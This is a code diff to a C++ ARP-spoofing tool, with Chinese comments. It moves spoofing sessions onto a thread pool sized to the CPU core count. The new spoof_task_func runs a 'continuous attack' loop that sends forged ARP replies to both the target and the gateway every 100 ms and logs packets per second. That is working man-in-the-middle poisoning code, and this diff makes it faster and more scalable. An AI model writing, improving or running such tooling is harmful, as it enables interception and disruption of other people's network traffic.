@@ -3,6 +3,7 @@
 #include <iostream>
 #include <sys/socket.h>
 #include <netinet/if_ether.h>
+#include <net/if_arp.h>  // 添加ARP定义
 #include <net/if.h>
 #include <sys/ioctl.h>
 #include <unistd.h>
@@ -14,6 +15,13 @@
 
 ARPSpoofer::ARPSpoofer(const std::string& interface) 
     : interface_(interface), raw_socket_(-1), total_packets_sent_(0), total_sessions_(0) {
+    
+    // 创建高性能线程池，使用CPU核心数
+    size_t num_threads = std::thread::hardware_concurrency();
+    if (num_threads == 0) num_threads = 4;  // 默认4个线程
+    
+    thread_pool_ = std::make_unique<HighPerformanceThreadPool>(num_threads);
+    std::cout << "[ARP Spoofer] 已创建高性能线程池，线程数: " << num_threads << std::endl;
 }
 
 ARPSpoofer::~ARPSpoofer() {
@@ -27,11 +35,21 @@ bool ARPSpoofer::initialize() {
         return false;
     }
     
-    std::cout << "[ARP Spoofer] Initialized successfully" << std::endl;
+    // 启动线程池
+    thread_pool_->start();
+    
+    std::cout << "[ARP Spoofer] Initialized successfully with thread pool" << std::endl;
     return true;
 }
 
 void ARPSpoofer::shutdown() {
+    std::cout << "[ARP Spoofer] Shutting down..." << std::endl;
+    
+    // 停止线程池
+    if (thread_pool_) {
+        thread_pool_->stop();
+    }
+    
     // 停止所有活跃会话
     std::lock_guard<std::mutex> lock(sessions_mutex_);
     
@@ -73,15 +91,23 @@ bool ARPSpoofer::start_spoofing(const std::string& target_ip, const std::string&
     session->packets_sent = 0;
     session->start_time = get_timestamp_ms();
     
-    // 启动欺骗线程
-    session->spoof_thread = std::make_unique<std::thread>(
-        &ARPSpoofer::spoof_thread_func, this, target_ip
-    );
+    // 🔧 使用线程池分配任务，基于IP哈希到特定线程
+    // 这确保每个IP总是由同一个线程处理，避免竞争
+    bool task_assigned = thread_pool_->assign_ip_task(target_ip, 
+        [this, target_ip, gateway_ip, target_mac, gateway_mac](const std::string& ip) {
+            this->spoof_task_func(ip, gateway_ip, target_mac, gateway_mac);
+        });
+    
+    if (!task_assigned) {
+        std::cerr << "[ARP Spoofer] Failed to assign task to thread pool for " << target_ip << std::endl;
+        return false;
+    }
     
     active_sessions_[target_ip] = std::move(session);
     total_sessions_++;
     
-    std::cout << "[ARP Spoofer] Started spoofing " << target_ip << " -> " << gateway_ip << std::endl;
+    std::cout << "[ARP Spoofer] Started spoofing " << target_ip << " -> " << gateway_ip 
+              << " (assigned to thread pool)" << std::endl;
     return true;
 }
 
@@ -263,6 +289,90 @@ void ARPSpoofer::spoof_thread_func(const std::string& target_ip) {
     }
     
     std::cout << "[ARP Spoofer] Spoof thread ended for " << target_ip << std::endl;
+}
+
+// 线程池任务函数 - 高性能版本，每个线程专门处理一组IP
+void ARPSpoofer::spoof_task_func(const std::string& target_ip, const std::string& gateway_ip,
+                                const std::string& target_mac, const std::string& gateway_mac) {
+    
+    std::string my_mac = get_interface_mac();
+    if (my_mac.empty()) {
+        std::cerr << "[ARP Spoofer] Failed to get interface MAC" << std::endl;
+        return;
+    }
+    
+    std::cout << "[ARP Spoofer] Starting continuous attack on " << target_ip 
+              << " (Thread Pool Mode)" << std::endl;
+    
+    auto start_time = std::chrono::steady_clock::now();
+    uint64_t packets_sent = 0;
+    
+    // 持续攻击循环
+    while (true) {
+        // 检查会话是否仍然活跃
+        bool session_active = false;
+        {
+            std::lock_guard<std::mutex> lock(sessions_mutex_);
+            auto it = active_sessions_.find(target_ip);
+            if (it != active_sessions_.end() && it->second->active) {
+                session_active = true;
+            }
+        }
+        
+        if (!session_active) {
+            break;  // 会话已停止
+        }
+        
+        // 发送双向ARP欺骗包
+        // 1. 告诉目标：网关的MAC是我的MAC
+        bool success1 = send_arp_packet(gateway_ip, my_mac, target_ip, target_mac, ARPOP_REPLY);
+        
+        // 2. 告诉网关：目标的MAC是我的MAC  
+        bool success2 = send_arp_packet(target_ip, my_mac, gateway_ip, gateway_mac, ARPOP_REPLY);
+        
+        if (success1 && success2) {
+            packets_sent += 2;
+            total_packets_sent_.fetch_add(2);
+            
+            // 更新会话统计
+            {
+                std::lock_guard<std::mutex> lock(sessions_mutex_);
+                auto it = active_sessions_.find(target_ip);
+                if (it != active_sessions_.end()) {
+                    it->second->packets_sent = packets_sent;
+                }
+            }
+        }
+        
+        // 短暂延迟（高频攻击）
+        std::this_thread::sleep_for(std::chrono::milliseconds(100));
+        
+        // 每10秒输出一次统计信息
+        auto now = std::chrono::steady_clock::now();
+        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start_time).count();
+        if (elapsed > 0 && elapsed % 10 == 0) {
+            std::cout << "[ARP Spoofer] " << target_ip << " - 已发送 " << packets_sent 
+                      << " 个包，速率：" << (packets_sent / elapsed) << " pps" << std::endl;
+        }
+    }
+    
+    std::cout << "[ARP Spoofer] Stopped attacking " << target_ip 
+              << " (Total packets: " << packets_sent << ")" << std::endl;
+}
+
+// 获取线程池统计信息
+std::vector<size_t> ARPSpoofer::get_thread_pool_queue_sizes() const {
+    if (thread_pool_) {
+        return thread_pool_->get_queue_sizes();
+    }
+    return {};
+}
+
+double ARPSpoofer::get_thread_pool_completion_rate() const {
+    if (thread_pool_) {
+        return thread_pool_->get_completion_rate();
+    }
+    return 0.0;
 }
 
 std::string ARPSpoofer::get_interface_mac() {
